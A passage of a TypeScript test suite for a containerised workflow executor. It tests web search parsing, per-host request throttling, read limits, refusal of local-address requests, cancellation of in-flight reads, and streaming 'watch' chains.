      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "block", id: "sortie", step: "start" });
        l({ t: "block", id: "sortie", step: "end", status: "succeeded", output: "forgée" });
        l({ t: "block", id: "inconnu", step: "start" });
        return [1, 2, 3];
      };`,
    });
    const relayed: unknown[] = [];
    b.infra.onTrace = (t) => relayed.push(t);
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: [1, 2, 3] } });
    expect(relayed).toEqual([
      { block: "a", step: "start" },
      { block: "a", step: "end", status: "succeeded", items: 3 },
      { block: "sortie", step: "start" },
      { block: "sortie", step: "end", status: "succeeded", items: 3 },
    ]);
  });

  it("a surTrace that throws does not break the run", async () => {
    const b = await bench(chain("a"), { "a.mjs": `export default async () => 1;` });
    b.infra.onTrace = () => {
      throw new Error("relais cassé");
    };
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: 1 } });
    expect(r.run.status).toBe("succeeded");
  });

  it("the container impossible to launch: erreur stop, failed run without a launched block", async () => {
    const b = await bench(chain("a"));
    b.infra.workshop = { harvestCommand: () => { throw new Error("Docker introuvable"); }, deleteHarvest: async () => {} };
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "stop", status: "error", error: "Récolte impossible à lancer : Docker introuvable" });
    expect(r.run.status).toBe("failed");
    expect(r.run.blocks.every((x) => x.status === "not-run")).toBe(true);
  });
});

describe("executerWorkflow: web search and open reads", () => {
  const BASE = "https://ddg.test/html/";
  const page = (name: string) => readFileSync(new URL(`./fixtures/duckduckgo/${name}`, import.meta.url), "utf8");
  const fixtureResults = (() => {
    const r = extractResults(page("resultats.html"), 20);
    if (!("results" in r)) throw new Error("attendu : des résultats");
    return r.results;
  })();

  /** Throttle with a fake clock: each wait advances the clock, without ever really waiting. */
  const fakePacing = () => {
    let t = 0;
    const waits: number[] = [];
    const pacing = new Pacing({
      now: () => t,
      wait: async (ms) => {
        waits.push(ms);
        t += ms;
      },
    });
    return { pacing: pacing, waits: waits };
  };

  /** A widget `a` → sortie whose code is given; `web` and the throttle set. */
  async function webBench(code: string, o: { web?: boolean; account?: string[]; html?: Record<string, string>; pages?: { url: string; title: string; text: string; links: [] }[]; pacing?: Pacing; delayMs?: number } = {}) {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: o.pages ?? [], html: o.html ?? {} } });
    const b = await bench(chain("a"), { "a.mjs": code }, { bridge: bridge, account: o.account, grant: { profile: "perso" }, delayMs: o.delayMs });
    b.ctx.sources = { ...b.ctx.sources, ...(o.web !== undefined ? { web: o.web } : {}) };
    b.infra.pacing = o.pacing ?? fakePacing().pacing;
    b.infra.searchUrl = BASE;
    return { b, bridge: bridge, html: () => bridge.calls.filter((a) => a.method === "readHtmlInvisible") };
  }
  const value = (r: Awaited<ReturnType<typeof runWorkflow>>) => (r.issue.t === "end" ? r.issue.output.value : r.issue);
  /** Code that makes these calls one after the other and returns, for each, the result or « erreur: <message> ». */
  const afterwards = (calls: string[]) => `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
    export default async (e, w) => { const r = []; ${calls.map((a) => `r.push(await essai(${a}));`).join(" ")} return r; };`;

  it("chercherWeb returns the results of the recorded page, search url built on urlRecherche", async () => {
    const { b, html } = await webBench(afterwards([`w.searchWeb("clio fiabilité", { count: 3 })`]), {
      web: true,
      html: { [searchUrl("clio fiabilité", BASE)]: page("resultats.html") },
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([fixtureResults.slice(0, 3)]);
    expect(html().map((a) => a.args)).toEqual([[searchUrl("clio fiabilité", BASE), { localAddresses: true }]]);
  });

  it("chercherWeb drops results to a local address, then cuts to nombre", async () => {
    const block = (u: string) => `<div class="result"><a class="result__a" href="${u}">T</a><a class="result__snippet">E</a></div>`;
    const local = [
      "http://127.0.0.1:8080/admin",
      "http://localhost/x",
      "http://192.168.1.1/",
      "http://imprimante.local/",
      "http://[::1]/",
      "https://a.example/",
      "https://b.example/",
      "https://c.example/",
    ].map(block).join("");
    const { b } = await webBench(afterwards([`w.searchWeb("x", { count: 2 })`]), { web: true, html: { [searchUrl("x", BASE)]: local } });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([[{ title: "T", url: "https://a.example/", excerpt: "E" }, { title: "T", url: "https://b.example/", excerpt: "E" }]]);
  });

  it("without web: WEB_REQUIRED, no call to the bridge", async () => {
    const { b, bridge: bridge } = await webBench(afterwards([`w.searchWeb("x")`]), { html: { [searchUrl("x", BASE)]: page("resultats.html") } });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
    expect(bridge.calls).toEqual([]);
  });

  it("widget with an account: WEB_REQUIRED", async () => {
    // web with an account is refused at the widget.json read; the executor refuses anyway.
    const { b, html } = await webBench(afterwards([`w.searchWeb("x")`]), {
      web: true,
      account: ["mail.google.com"],
      html: { [searchUrl("x", BASE)]: page("resultats.html") },
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
    expect(html()).toEqual([]);
  });

  it("31e recherche : SEARCHES_CAP, 30 lectures de HTML seulement", async () => {
    const { pacing: pacing, waits: waits } = fakePacing();
    const { b, html } = await webBench(afterwards(Array.from({ length: 31 }, () => `w.searchWeb("clio", { count: 1 })`)), {
      web: true,
      pacing: pacing,
      html: { [searchUrl("clio", BASE)]: page("resultats.html") },
    });
    const r = await runWorkflow(b.ctx, b.infra);
    const output = value(r) as unknown[];
    expect(output.slice(0, 30)).toEqual(Array.from({ length: 30 }, () => fixtureResults.slice(0, 1)));
    expect(output[30]).toBe(`erreur: ${SEARCHES_CAP}`);
    expect(html()).toHaveLength(30);
    // Throttled: 2 s between two searches.
    expect(waits).toEqual(Array.from({ length: 29 }, () => 2000));
  });

  it("check page: SEARCH_DENIED, then SEARCHES_STOPPED without a new read", async () => {
    const { b, html } = await webBench(afterwards([`w.searchWeb("a")`, `w.searchWeb("b")`]), {
      web: true,
      html: { [searchUrl("a", BASE)]: page("verification.html"), [searchUrl("b", BASE)]: page("resultats.html") },
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([`erreur: ${SEARCH_DENIED}`, `erreur: ${SEARCHES_STOPPED}`]);
    expect(html()).toHaveLength(1);
  });

  it("a queued search when the refusal arrives does not leave, and does not consume the search gap", async () => {
    const { pacing: pacing, waits: waits } = fakePacing();
    const { b, html } = await webBench(
      `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
      export default async (e, w) => Promise.all([essai(w.searchWeb("a")), essai(w.searchWeb("b"))]);`,
      { web: true, pacing: pacing, html: { [searchUrl("a", BASE)]: page("verification.html"), [searchUrl("b", BASE)]: page("resultats.html") } },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([`erreur: ${SEARCH_DENIED}`, `erreur: ${SEARCHES_STOPPED}`]);
    expect(html()).toHaveLength(1);
    // « b » waited for nothing; the next search waits 2 s from the end of « a », the only one that was played (not 2 s more).
    await pacing.search(async () => {});
    expect(waits).toEqual([2000]);
  });

  it("page changed: UNREADABLE_RESULTS, never an empty list; no result: empty list", async () => {
    const { b } = await webBench(afterwards([`w.searchWeb("a")`, `w.searchWeb("b")`]), {
      web: true,
      html: { [searchUrl("a", BASE)]: page("changee.html"), [searchUrl("b", BASE)]: page("aucun-resultat.html") },
    });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual([`erreur: ${UNREADABLE_RESULTS}`, []]);
  });

  it("web widget: the 101st open read (pages and feeds) throws TOO_MANY_READS", async () => {
    const web = await webServer({ "/f": (res) => res.end("<rss><channel><item><title>T</title><link>https://x.example/</link></item></channel></rss>") });
    const { pacing: pacing, waits: waits } = fakePacing();
    const spy = vi.spyOn(pacing, "read");
    const { b, bridge: bridge } = await webBench(
      `const essai = (p) => p.then(() => "ok", (e) => "erreur: " + e.message);
      export default async (e, w) => {
        const r = [];
        for (let i = 0; i < 40; i++) r.push(await essai(w.readPage("https://www.pages.example/" + i)));
        for (let i = 0; i < 30; i++) r.push(await essai(w.fetch("${web.url}/f")));
        for (let i = 0; i < 30; i++) r.push(await essai(w.readFeed("${web.url}/f")));
        r.push(await essai(w.readPage("https://pages.example/de-trop")));
        r.push(await essai(w.fetch("${web.url}/f")));
        return r;
      };`,
      { web: true, pacing: pacing },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    const output = value(r) as string[];
    expect(output.slice(0, 100).every((x) => x === "ok")).toBe(true);
    expect(output.slice(100)).toEqual([`erreur: ${TOO_MANY_READS}`, `erreur: ${TOO_MANY_READS}`]);
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(40);
    expect(web.requests).toHaveLength(60);
    // Each goes through the throttle, per host: 1 s between two reads of the same host.
    expect(spy).toHaveBeenCalledTimes(100);
    expect(spy.mock.calls.slice(0, 40).every((c) => c[0] === "www.pages.example")).toBe(true);
    expect(spy.mock.calls.slice(40).every((c) => c[0] === "127.0.0.1")).toBe(true);
    expect(waits.every((ms) => ms === 1000)).toBe(true);
    expect(waits).toHaveLength(98);
  });

  it("web widget: a read redirected to another site waits for that site's throttle", async () => {
    const { pacing: pacing, waits: waits } = fakePacing();
    const bridge = new FakeBridge([], {
      active: null,
      allow: false,
      read: {
        pages: [{ url: "https://b.example/2", title: "deux", text: "", links: [] }],
        redirects: { "https://a.example/court": "https://www.b.example/2", "https://a.example/meme": "https://www.a.example/x" },
      },
    });
    const b = await bench(
      chain("a"),
      {
        "a.mjs": `export default async (e, w) => [
          (await w.readPage("https://b.example/1")).url,
          (await w.readPage("https://a.example/court")).url,
          (await w.readPage("https://a.example/meme")).url,
        ];`,
      },
      { bridge: bridge },
    );
    b.ctx.sources = { ...b.ctx.sources, web: true };
    b.infra.pacing = pacing;
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual(["https://b.example/1", "https://www.b.example/2", "https://www.a.example/x"]);
    // b.example read just before: the redirect waits 1 s. a.example, released at the redirect, does not make
    // the 3rd read wait, redirected to the same site (www.).
    expect(bridge.calls.filter((a) => a.method === "changeHost").map((a) => a.args[0])).toEqual(["www.b.example", "www.a.example"]);
    expect(waits).toEqual([1000]);
  });

  it("web widget: a fetch redirected to another site waits for that site's throttle", async () => {
    let elsewhere = "";
    // /vers-localhost redirects to the same server, under another host name.
    const web = await webServer({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: elsewhere });
        res.end();
      },
    });
    elsewhere = `http://localhost:${web.port}/f`;
    const { pacing: pacing, waits: waits } = fakePacing();
    const read = vi.spyOn(pacing, "read");
    const { b } = await webBench(
      `export default async (e, w) => [await w.fetch("${elsewhere}"), await w.fetch("${web.url}/vers-localhost")];`,
      { web: true, pacing: pacing },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toEqual(["fini", "fini"]);
    expect(read.mock.calls.map((c) => c[0])).toEqual(["localhost", "127.0.0.1"]);
    // localhost read just before: the redirect waits for its gap.
    expect(waits).toEqual([1000]);
  });

  it("recuperer: the wait for a redirect's site is bounded by the stop (and the timeout), without a request to the target", async () => {
    let target = "";
    const web = await webServer({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: target });
        res.end();
      },
    });
    target = `http://localhost:${web.port}/f`;
    const stop = new AbortController();
    const changeHost = vi.fn(() => new Promise<void>(() => {}));
    const p = fetch(`${web.url}/vers-localhost`, "text", null, true, stop.signal, changeHost);
    p.catch(() => {});
    await vi.waitFor(() => expect(changeHost).toHaveBeenCalledWith("localhost"));
    stop.abort(new Error("Exécution arrêtée"));
    await expect(p).rejects.toThrow("Exécution arrêtée");
    expect(web.requests).toEqual(["/vers-localhost"]);
  });

  it("recuperer: a name that resolves to the machine is refused at connection, without a request", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    // Like 127.0.0.1.nip.io, without network: the name passes the text check, its address is local.
    const resolution = vi.spyOn(dns, "lookup").mockImplementation(((_h: string, _o: unknown, callback: (e: null, a: dns.LookupAddress[]) => void) =>
      callback(null, [{ address: "127.0.0.1", family: 4 }])) as unknown as typeof dns.lookup);
    try {
      await expect(fetch(`http://piege.example:${web.port}/`, "text", null, false)).rejects.toThrow("Adresse locale refusée");
    } finally {
      resolution.mockRestore();
    }
    expect(web.requests).toEqual([]);
  });

  it("widget without web: 150 reads go through, no throttle wait", async () => {
    const spy = new Pacing({ wait: async () => { throw new Error("aucune attente attendue"); } });
    const read = vi.spyOn(spy, "read");
    const search = vi.spyOn(spy, "search");
    const { b, bridge: bridge } = await webBench(
      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.readPage("https://pages.example/" + i); return "fini"; };`,
      { pacing: spy },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toBe("fini");
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(150);
    expect(read).not.toHaveBeenCalled();
    expect(search).not.toHaveBeenCalled();
  });

  it("run stop: a read waiting for the throttle does not leave", async () => {
    let t = 0;
    const pending: (() => void)[] = [];
    const pacing = new Pacing({ now: () => t, wait: () => new Promise<void>((ok) => pending.push(ok)) });
    const { b, bridge: bridge } = await webBench(
      `export default async (e, w) => { await w.readPage("https://pages.example/1"); return w.readPage("https://pages.example/2"); };`,
      { web: true, pacing: pacing, delayMs: 300 },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "stop", status: "error", error: "Délai dépassé" });
    // The gap elapses after the stop: the queued read does not leave.
    t += 10_000;
    for (const ok of pending.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(bridge.calls.filter((a) => a.method === "readPageInvisible").map((a) => a.args[0])).toEqual(["https://pages.example/1"]);
  });

  it("end of the run: a search still queued does not leave", async () => {
    let t = 0;
    const pending: (() => void)[] = [];
    const pacing = new Pacing({ now: () => t, wait: () => new Promise<void>((ok) => pending.push(ok)) });
    const { b, html } = await webBench(
      `export default async (e, w) => { await w.searchWeb("a"); w.searchWeb("b").catch(() => {}); return "fini"; };`,
      { web: true, pacing: pacing, html: { [searchUrl("a", BASE)]: page("resultats.html") } },
    );
    const r = await runWorkflow(b.ctx, b.infra);
    expect(value(r)).toBe("fini");
    t += 10_000;
    for (const ok of pending.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(html()).toHaveLength(1);
  });
});

describe("executerWorkflow: a stop cancels the reads in progress", () => {
  const BASE = "https://ddg.test/html/";
  /** A fake container: sends these calls, then waits to be killed; keeps what the kernel writes to it. */
  const callsContainer = (calls: { f: string; a: unknown }[]) => {
    const received: string[] = [];
    let kill = () => {};
    const launch: ProcessLauncher = () => {
      const stdout = new PassThrough();
      const stderr = new PassThrough();
      const stdin = new PassThrough();
      stdin.on("data", (d) => received.push(String(d)));
      let finish!: (c: number | null) => void;
      const end = new Promise<number | null>((ok) => (finish = ok));
      kill = () => {
        stdout.end();
        stderr.end();
        finish(null);
      };
      setImmediate(() => calls.forEach((x, i) => stdout.write(JSON.stringify({ t: "call", n: i + 1, ...x }) + "\n")));
      return { stdin, stdout, stderr, kill: () => kill(), end: end };
    };
    return {
      launch: launch,
      /** The container is removed from outside (quitting the browser). */
      kill: () => kill(),
      responses: () => received.join("").split("\n").filter((l) => l.includes(`"t":"answer"`)),
    };
  };
  const cancelledList = (bridge: FakeBridge) => bridge.calls.filter((a) => a.method === "readCanceled").map((a) => a.args[0]);
  const value = (r: Awaited<ReturnType<typeof runWorkflow>>) => (r.issue.t === "end" ? r.issue.output.value : r.issue);

  it("timeout exceeded: pages (public, with an account) and fetch in progress cancelled, nothing comes back to the container", async () => {
    const closed: string[] = [];
    const web = await webServer({ "/lent": (res) => void res.on("close", () => closed.push("/lent")) });
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [], suspended: ["https://pages.example/a", "https://app.daily.dev/b"] } });
    const c = callsContainer([
      { f: "readPage", a: { url: "https://pages.example/a" } },
      { f: "readPage", a: { url: "https://app.daily.dev/b", account: true } },
      { f: "fetch", a: { url: `${web.url}/lent` } },
    ]);
    const b = await bench(chain("a"), {}, { bridge: bridge, account: ["app.daily.dev"], public: ["pages.example", "127.0.0.1"], grant: { profile: "perso" }, delayMs: 300, launch: c.launch });
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "stop", status: "error", error: "Délai dépassé" });
    await vi.waitFor(() => {
      expect(cancelledList(bridge).sort()).toEqual(["https://app.daily.dev/b", "https://pages.example/a"]);
      expect(closed).toEqual(["/lent"]);
    });
    await new Promise((ok) => setTimeout(ok, 20));
    expect(c.responses()).toEqual([]);
  });

  it("container removed (quit): its reads are cancelled, not those of another run", async () => {
    const bridge = new FakeBridge([], {
      active: null,
      allow: false,
      read: { pages: [{ url: "https://pages.example/b", title: "B", text: "", links: [] }], suspended: ["https://pages.example/a", "https://pages.example/b"] },
    });
    const other = await bench(chain("a"), { "a.mjs": `export default async (e, w) => (await w.readPage("https://pages.example/b")).title;` }, { bridge: bridge });
    const c = callsContainer([{ f: "readPage", a: { url: "https://pages.example/a" } }]);
    const b = await bench(chain("a"), {}, { bridge: bridge, launch: c.launch });
    const rOther = runWorkflow(other.ctx, other.infra);
    const r = runWorkflow(b.ctx, b.infra);
    await vi.waitFor(() => expect(bridge.calls.filter((a) => a.method === "readPageInvisible")).toHaveLength(2));
    c.kill();
    expect((await r).issue.t).toBe("failure");
    await vi.waitFor(() => expect(cancelledList(bridge)).toEqual(["https://pages.example/a"]));
    // The other run, for its part, still reads.
    expect(bridge.release("https://pages.example/b")).toBe(1);
    expect(value(await rOther)).toBe("B");
    expect(cancelledList(bridge)).toEqual(["https://pages.example/a"]);
  });

  it("web widget: a read and a search in progress cancelled free their turn, the gap counts from the cancellation", async () => {
    let t = 0;
    const waits: number[] = [];
    const pacing = new Pacing({
      now: () => t,
      wait: async (ms) => {
        waits.push(ms);
        t += ms;
      },
    });
    const bridge = new FakeBridge([], {
      active: null,
      allow: false,
      read: {
        pages: [{ url: "https://pages.example/2", title: "deux", text: "", links: [] }],
        html: { [searchUrl("b", BASE)]: readFileSync(new URL("./fixtures/duckduckgo/aucun-resultat.html", import.meta.url), "utf8") },
        suspended: ["https://pages.example/1", searchUrl("a", BASE)],
      },
    });
    const prepare = (bb: Bench) => {
      bb.ctx.sources = { ...bb.ctx.sources, web: true };
      bb.infra.pacing = pacing;
      bb.infra.searchUrl = BASE;
    };
    const c = callsContainer([
      { f: "readPage", a: { url: "https://pages.example/1" } },
      { f: "searchWeb", a: { query: "a", count: 1 } },
    ]);
    const b = await bench(chain("a"), {}, { bridge: bridge, delayMs: 300, launch: c.launch });
    prepare(b);
    expect((await runWorkflow(b.ctx, b.infra)).issue).toEqual({ t: "stop", status: "error", error: "Délai dépassé" });
    await vi.waitFor(() => expect(cancelledList(bridge).sort()).toEqual(["https://pages.example/1", searchUrl("a", BASE)].sort()));
    // Another run on the same throttle: neither the host's lane nor the searches' lane stays taken.
    const next = await bench(
      chain("a"),
      { "a.mjs": `export default async (e, w) => [(await w.readPage("https://pages.example/2")).title, (await w.searchWeb("b", { count: 1 })).length];` },
      { bridge: bridge, delayMs: 3000 },
    );
    prepare(next);
    expect(value(await runWorkflow(next.ctx, next.infra))).toEqual(["deux", 0]);
    // The cancelled requests had left: the gap counts from their cancellation (t = 0). The read waits its 1 s,
    // then the search the rest of its 2 s (1 s already elapsed).
    expect(waits).toEqual([1000, 1000]);
  });
});

describe("executerWorkflow: watch (duration, chain, publications, memory along the way)", () => {
  /** liste (code) → fiche → avis (source.recuperer per element) → sortie. */
  const watch = (o: { live?: boolean } = {}) => ({
    version: 1,
    blocks: [
      { id: "liste", type: "code", params: { source: "liste.mjs" } },
      { id: "fiche", type: "source.fetch", params: { url: "{url}", perItem: true } },
      { id: "avis", type: "source.fetch", params: { url: "{url}", perItem: true } },
      { id: "sortie", type: "output", params: { to: "widget", ...(o.live ? { live: true } : {}) } },
    ],
    links: [{ from: "liste", to: "fiche" }, { from: "fiche", to: "avis" }, { from: "avis", to: "sortie" }],
  });

  /**
   * A fake container that writes its lines one by one (a function is called in its place: advance the clock; a text
   * is written as is, several lines at once);
   * `recu` receives what the kernel writes to it; `bloque`: it never exits on its own (only killed).
   */
  const launcherSteps = (step: unknown[], o: { received?: string[]; blocked?: boolean } = {}): ProcessLauncher => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.received?.push(d.toString()));
    let kill = () => {};
    const end = new Promise<number | null>((ok) => {
      kill = () => ok(null);
      void (async () => {
        for (const p of step) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.blocked) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })();
    });
    return { stdin, stdout, stderr, kill: () => kill(), end: end };
  };

  /** A clock that the steps make advance. */
  const fakeClock = (b: Bench) => {
    let t = NOW.getTime();
    b.infra.clock = () => new Date(t);
    return (ms: number) => () => {
      t += ms;
    };
  };

  /** The workshop's real command, kept to read its `timeout`. */
  const connectWorkshop = (b: Bench) => {
    const workshop = new Workshop({ paths: spacePaths("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const commands: string[][] = [];
    b.infra.workshop = {
      harvestCommand: (id, d, m, s) => {
        const c = workshop.harvestCommand(id, d, m, s);
        commands.push(c);
        return c;
      },
      deleteHarvest: async () => {},
    };
    return () => {
      const c = commands[0]!;
      return c.slice(c.indexOf("timeout"), c.indexOf("timeout") + 4);
    };
  };

  /** The delays given to setTimeout during `f`. */
  async function delaysDuring(f: () => Promise<unknown>): Promise<unknown[]> {
    const spy = vi.spyOn(globalThis, "setTimeout");
    try {
      await f();
      return spy.mock.calls.map((c) => c[1]);
    } finally {
      spy.mockRestore();
    }
  }

  const blockStart = (id: string) => ({ t: "block", id, step: "start" });
  const blockEnd = (id: string, output: unknown = [{ url: "https://a.example/1" }], status = "succeeded") => ({ t: "block", id, step: "end", status: status, output: output });
  const pub = (data: unknown, done: number, total: number) => ({ t: "publication", data: data, done: done, total });
  const attempt = (b: Bench) => {
    b.ctx.trigger = "replay";
    b.ctx.replay = { reruns: [...b.ctx.valid.order], outputs: {}, resumed: {} };
  };

  it("the watch() chain is fiche → avis", () => {
    expect(streamingChain(valid(watch({ live: true })))).toEqual(["fiche", "avis"]);
  });

  it("widget without the new fields: debut line identical to today, timeout 180, delay 200 s", async () => {
    const received: string[] = [];
    const b = await bench(watch(), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: received }) });
    const timeout = connectWorkshop(b);
    const delays = await delaysDuring(() => runWorkflow(b.ctx, b.infra));
    const { workflow, order: order } = b.ctx.valid;
    expect(received.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "start", previous: null, now: NOW.toISOString(), config: { interests: "rust" }, workflow: { blocks: workflow.blocks, links: workflow.links, order: order } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delays).toContain(200_000);
  });

  it("Gmail widget (account, harvest.mjs alone): identical debut line, timeout 180, delay 200 s, neither surMemoire nor memoire on an echec", async () => {
    const received: string[] = [];
    const implicit = { version: 1, blocks: [{ id: "recolte", type: "code", params: { source: "harvest.mjs" } }, { id: "sortie", type: "output", params: { to: "widget" } }], links: [{ from: "recolte", to: "sortie" }] };
    const b = await bench(implicit, {}, {
      account: ["mail.google.com"],
      grant: { profile: "p1" },
      launch: launcherSteps([{ t: "memory", memory: { harvest: { type: "code", value: 1 } } }, { t: "log", block: "recolte", text: "x" }, { t: "failure", error: "cassé" }], { received: received }),
    });
    const timeout = connectWorkshop(b);
    const memories: unknown[] = [];
    b.infra.onMemory = async (m) => void memories.push(m);
    let outcome: unknown;
    const delays = await delaysDuring(async () => {
      outcome = (await runWorkflow(b.ctx, b.infra)).issue;
    });
    const { workflow, order: order } = b.ctx.valid;
    expect(received.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "start", previous: null, now: NOW.toISOString(), config: { interests: "rust" }, workflow: { blocks: workflow.blocks, links: workflow.links, order: order } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delays).toContain(200_000);
    expect(memories).toEqual([]);
    expect(outcome).toEqual({ t: "failure", error: "cassé", codeError: true });
  });

  it("dureeMaxMinutes 30: debut carries limiteMs 1,800,000 and progressif, container launched with timeout 1830, delay 1,850 s", async () => {
    const received: string[] = [];
    const b = await bench(watch(), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: received }) });
    b.ctx.maxDurationMinutes = 30;
    const timeout = connectWorkshop(b);
    const delays = await delaysDuring(() => runWorkflow(b.ctx, b.infra));
    const start = JSON.parse(received.join("").split("\n")[0]!);
    expect(start).toMatchObject({ t: "start", limitMs: 1_800_000, progressive: true });
    expect(timeout()).toEqual(["timeout", "-k", "5", "1830"]);
    expect(delays).toContain(1_850_000);
    expect(delays).not.toContain(200_000);
  });

  it("auFilDeLEau without dureeMaxMinutes: progressif without limiteMs; a trial is never progressive", async () => {
    const received: string[] = [];
    const b = await bench(watch({ live: true }), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: received }) });
    await runWorkflow(b.ctx, b.infra);
    const start = JSON.parse(received.join("").split("\n")[0]!);
    expect(start.progressive).toBe(true);
    expect("limitMs" in start).toBe(false);

    const receivedAttempt: string[] = [];
    const e = await bench(watch({ live: true }), {}, { launch: launcherSteps([{ t: "end", data: null }], { received: receivedAttempt }) });
    e.ctx.maxDurationMinutes = 30;
    attempt(e);
    await runWorkflow(e.ctx, e.infra);
    const attemptStart = JSON.parse(receivedAttempt.join("").split("\n")[0]!);
    expect("progressive" in attemptStart).toBe(false);
    expect(attemptStart.limitMs).toBe(1_800_000);
  });

  it("chain traces accepted; an out-of-order chain end rejected", async () => {
    const inChain = await bench(watch({ live: true }), {}, {
      launch: launcherSteps([
        blockStart("liste"), blockEnd("liste"),
        blockStart("fiche"), blockStart("avis"),
        { t: "log", block: "fiche", text: "lu" },
        blockEnd("fiche"), blockEnd("avis"),
        blockStart("sortie"), blockEnd("sortie"),
        { t: "end", data: [] },
      ]),
    });
    const relayed: unknown[] = [];
    inChain.infra.onTrace = (t) => relayed.push(t);
    const r = await runWorkflow(inChain.ctx, inChain.infra);
    expect(r.run.status).toBe("succeeded");
    expect(r.run.blocks.find((x) => x.id === "fiche")!.log).toEqual(["lu"]);
    expect(relayed).toEqual([
      { block: "liste", step: "start" },
      { block: "liste", step: "end", status: "succeeded", items: 1 },
      { block: "fiche", step: "start" },
      { block: "avis", step: "start" },
      { block: "fiche", step: "end", status: "succeeded", items: 1 },
      { block: "avis", step: "end", status: "succeeded", items: 1 },
      { block: "sortie", step: "start" },
      { block: "sortie", step: "end", status: "succeeded", items: 1 },
    ]);

    // End of avis before that of fiche: rejected; avis started without an end, the output (arriving too early) rejected.
    const unordered = await bench(watch({ live: true }), {}, {
      launch: launcherSteps([
        blockStart("liste"), blockEnd("liste"),
        blockStart("fiche"), blockStart("avis"),
        blockEnd("avis"), blockEnd("fiche"),
        blockStart("sortie"),
        { t: "end", data: [] },
      ]),
    });
    const relayees2: unknown[] = [];
    unordered.infra.onTrace = (t) => relayees2.push(t);
    const r2 = await runWorkflow(unordered.ctx, unordered.infra);
    expect(r2.run.blocks.map((x) => x.status)).toEqual(["succeeded", "succeeded", "failed", "not-run"]);
    expect(relayees2).not.toContainEqual(expect.objectContaining({ block: "avis", step: "end" }));

    // Without auFilDeLEau: two debut in a row, the second is rejected as today.
    const without = await bench(watch(), {}, {
      launch: launcherSteps([
        blockStart("liste"), blockEnd("liste"),
        blockStart("fiche"), blockStart("avis"),
        blockEnd("fiche"), blockEnd("avis"),
        { t: "end", data: [] },
      ]),
    });
    const r3 = await runWorkflow(without.ctx, without.infra);
    expect(r3.run.blocks.map((x) => x.status)).toEqual(["succeeded", "succeeded", "not-run", "not-run"]);

    // A trial has no chain: same rejection.
    const e = await bench(watch({ live: true }), {}, {
      launch: launcherSteps([
        blockStart("liste"), blockEnd("liste"),
        blockStart("fiche"), blockStart("avis"),
        blockEnd("fiche"), blockEnd("avis"),
        { t: "end", data: [] },
      ]),
    });
    attempt(e);
    const r4 = await runWorkflow(e.ctx, e.infra);
    expect(r4.run.blocks.map((x) => x.status)).toEqual(["succeeded", "succeeded", "not-run", "not-run"]);
  });

  it("publication relayed only during the chain and 5 s apart; ignored before the chain, for a trial, without auFilDeLEau, beyond 2 MB", async () => {
    const big = "x".repeat(2 * 1024 * 1024);
    const step = (advance: (ms: number) => () => void) => [
      blockStart("liste"), blockEnd("liste"),
      pub("avant la chaîne", 0, 3),
      blockStart("fiche"),
      pub("entre deux debut", 0, 3),
      blockStart("avis"),
      pub("A", 1, 3),
      advance(3000), pub("trop tôt", 2, 3),
      advance(1500), pub("C", 2, 3),
      advance(5000), pub("faits > total", 4, 3),
      advance(5000), pub(big, 3, 3),
      advance(5000), pub("D", 3, 3),
      blockEnd("fiche"),
      advance(5000), pub("après une fin", 3, 3),
      blockEnd("avis"),
      advance(5000), pub("après la chaîne", 3, 3),
      blockStart("sortie"), blockEnd("sortie"),
      { t: "end", data: "finale" },
    ];
    const launchWith = async (workflow: unknown, set: (b: Bench) => void = () => {}) => {
      const b = await bench(workflow);
      const advance = fakeClock(b);
      b.infra.launch = launcherSteps(step(advance));
      set(b);
